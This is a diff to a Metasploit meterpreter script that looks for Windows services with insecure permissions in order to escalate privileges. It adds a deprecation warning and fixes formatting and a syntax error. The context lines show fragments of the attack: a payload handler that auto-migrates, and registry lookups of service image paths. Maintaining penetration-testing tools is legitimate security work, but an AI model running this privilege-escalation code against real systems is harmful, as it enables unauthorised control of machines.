@@ -1,4 +1,11 @@
 ##
+# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# If you'd like to imporve this script, please try to port it as a post
+# module instead. Thank you.
+##
+
+
+##
 # Many services are configured with insecure permissions. This
 # script attempts to create a service, then searches through a list of
 # existing services to look for insecure file or configuration
@@ -78,8 +85,8 @@ handler.datastore['InitialAutoRunScript'] = "migrate -f"
 handler.datastore['ExitOnSession'] = false
 #start a handler to be ready
 handler.exploit_simple(
-  'Payload'	=> handler.datastore['PAYLOAD'],
-  'RunAsJob'       => true
+  'Payload'  => handler.datastore['PAYLOAD'],
+  'RunAsJob' => true
 )
 
 #attempt to make new service
@@ -132,7 +139,7 @@ service_list.each do |serv|
     moved = false
     configed = false
     #default path, but there should be an ImagePath registry key
-    source = "#{sysdir}\\system32\\#{serv}.exe")
+    source = "#{sysdir}\\system32\\#{serv}.exe"
     #get path to exe; parse out quotes and arguments
     sourceorig = registry_getvaldata("#{serviceskey}\\#{serv}","ImagePath").to_s
     sourcemaybe = client.fs.file.expand_path(sourceorig)
